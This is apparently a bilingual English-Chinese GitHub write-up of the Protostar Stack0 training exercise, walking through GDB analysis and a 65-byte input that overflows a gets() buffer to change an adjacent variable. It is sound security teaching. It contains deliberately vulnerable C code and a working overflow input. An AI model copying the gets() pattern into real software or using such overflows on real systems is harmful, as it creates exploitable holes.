# Stack0
## Source Code 源码
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```
## Notes
The account and password of the virtual machine *Protostar* are both ***user***.  
This question is about buffer overflow issues with local variables. The file is at /opt/protostar/bin/stack0.  

`volatile int modified;`  
As accessing registers is much faster than accessing memory cells, compilers generally reduce to optimize the operation of memory, but may change the data. When a variable value is declared using **volatile**, the system always reads data from the memory where it is again, even if the instruction in front of it just read the data from there. To be precise, when a variable declared by this keyword is encountered, the compiler no longer optimizes the code that accesses the variable, thus providing stable access to a particular address. If **volatile** is not used, the compiler will optimize all the declared viriables.  

`char buffer[64];`  
A 64-byte string **buffer** is defined as a buffer. It is unsafe using the function **gets()** to enter a string into **buffer** (when more than 64 characters are entered).  
I use GDB for debugging. For easy operation and viewing, I use the virtual machine *Linux Ubuntu* to connect to the virtual machine *Protostar* by SSH protocol: `ssh user@<ip_addr>`;  
Open the interactive mode shell after connecting to the virtual machine *Protostar*: `bash -i`;  
After that, run GDB: `gdb -q stack0`;  
The assembly can be converted to intel format: `(gdb) set disassembly-flavor intel`;  
Print the assembly code for the function **main**: `(gdb) disas main`.  
![main assembly code](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/main-assembly0.png)  
According to the assembly code, we can know that the assembly code `mov DWORD PTR [esp+0x5c], 0x0`  at <main+9> indicates that the starting address of variable **modified** is *esp+0x5c*. The assembly code `lea eax,[esp+0x1c]` at <main+17> indicates that the starting address of variable **buffer** is *esp+0x1c*. The length of variable **buffer** is just 0x5c - 0x1c = 0x40. Thus, we can draw a graph about the memory condition after the allocation.  
![Stack](https://raw.githubusercontent.com/HryMurph/Exploit-Exercise-Protostar/master/Images/stack0.png)  
When the statement `gets(buffer);` is executed, the function **gets()** reads the input string from the input stream and writes the characters bit by bit to the memory starting from **[esp+0x1c]**. Due to its lack of overflow protection, when the character length exceeds 64 bits, it will cause an overflow and modify the value of variable **modified**.  
Set breakpoint on line 13: `(gdb) b 13`; Run the program: `r`.  
Firstly, enter the string "abcd" as the first test, the program stops at the breakpoint, then look at the memory data of variable **buffer**: `(gdb) x/64b $esp+0x1c`.  
![Buffer Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory0-1.png)  
As we can see, the first four bits of variable **buffer** are modified to 0x61, 0x62, 0x63, 0x64.  
Secondly, input string "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (70 'a') for the overflow attack test, the program still stops at the breakpoint. In addition to viewing the data of variable **buffer**, look at the value of variable **modified** :`(gdb) x/10b $esp+0x5c`.  
![Buffer and Modified Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory0-2.png)  
As we can see, the value of variable **modified** is no longer 0, but is modified to 0x61. Continue to run the program and judgement statement **modified != 0** is true.  
## Solution
In actual operation, it is more convenient to use the pipe to transmit parameters:  
`user@protostar:/opt/protostar/bin$ python -c "print 'a'*65" | ./stack0`.  

Result:  
![Solution](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/result0.png)


## 笔记
虚拟机*Protostar*的账号密码均为：***user***。  
本题训练有关局部变量的缓冲区溢出问题。本题路径：/opt/protostar/bin/stack0  

`volatile int modified;`  
**volatile**中文翻译为“易变的”，因为访问寄存器要比访问内存单元快的多，所以编译器一般都会减少优化存取内存的操作，但有可能会读脏数据。当要求使用**volatile**声明变量值的时候，系统总是重新从它所在的内存读取数据，即使它前面的指令刚刚从该处读取过数据。准确地说，遇到这个关键字声明的变量时，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问；如果不使用**volatile**，则编译器将对所声明的语句进行优化。

`char buffer[64];`  
定义了一个64字节的字符串**buffer**作为缓冲区，使用函数**gets()**向**buffer**输入字符串时存在溢出风险（当输入的字符超过64个）。  
使用GDB进行调试和分析。这里为了方便操作和查看，使用*Linux Ubuntu*虚拟机SSH连接到*Protostar*虚拟机：`ssh user@<ip_addr>`；  
连接到*Protostar*虚拟机后打开交互模式的Shell：`bash -i`；  
之后开始GDB调试**Stack0**：`gdb -q stack0`；  
进入GDB之后可将汇编转化为intel格式：`(gdb) set disassembly-flavor intel`；  
打印**main**函数的汇编代码：`(gdb) disas main`。  
![main assembly code](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/main-assembly0.png)  
通过分析汇编代码可以知道，<main+9>处的汇编代码`mov DWORD PTR [esp+0x5c],0x0`表示变量**modified**的起始地址为esp+0x5c；<main+17>处的汇编代码`lea eax,[esp+0x1c]`表示变量**buffer**的起始地址为esp+0x1c。恰好 0x5c - 0x1c = 0x40 便是变量**buffer**的长度。绘制出内存分配后的内存情况。
![Stack](https://raw.githubusercontent.com/HryMurph/Exploit-Exercise-Protostar/master/Images/stack0.png)  
执行`gets(buffer);`时，函数**gets()**会从输入缓冲区中读取输入的字符串，并从**[esp+0x1c]**开始逐位写字符。由于其缺乏溢出保护，因此当字符长度超过64位时就会造成溢出，修改变量**modified**的值。  
在第13行下断点：`(gdb) b 13`；运行：`r`。  
先输入字符串“abcd”作为第一组测试，程序停在断点处，此时查看变量**buffer**的数据：`(gdb) x/64b $esp+0x1c`。 
![Buffer Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory0-1.png)  
可以看到，变量**buffer**的前四位被修改为0x61、0x62、0x63、0x64。  
第二次输入字符串“aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”（70个‘a’）作溢出攻击测试，程序停在断点处，除查看**buffer**的数据外，加上查看变量**modified**的值：`(gdb) x/10b $esp+0x5c`。  
![Buffer and Modified Memory](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/memory0-2.png)
可以看到，变量**modified**的值不再是0，而是被修改成了0x61。继续运行程序，判断**modified != 0**成功。
## 结果
实际运行时为方便使用管道传参：  
`user@protostar:/opt/protostar/bin$ python -c "print 'a'*65" | ./stack0`.  

结果：  
![Solution](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/result0.png)


## Reference 参考
[CSDN: The Function of the Volatile Keyword in C ( Author: Ji Bo ) ( Language: Simplified Chinese )](https://blog.csdn.net/tigerjibo/article/details/7427366)  
[Github: z3tta/Exploit-Exercises-Protostar](https://github.com/z3tta/Exploit-Exercises-Protostar)  

#### Thanks Rayjoke for help! 感谢Rayjoke的帮助！  

#### This is my first repository on Github. Please correct me if there's any mistake in my notes. Thanks a lot! 这是我的第一篇Github博客，文中如有错漏，请斧正。十分感谢！
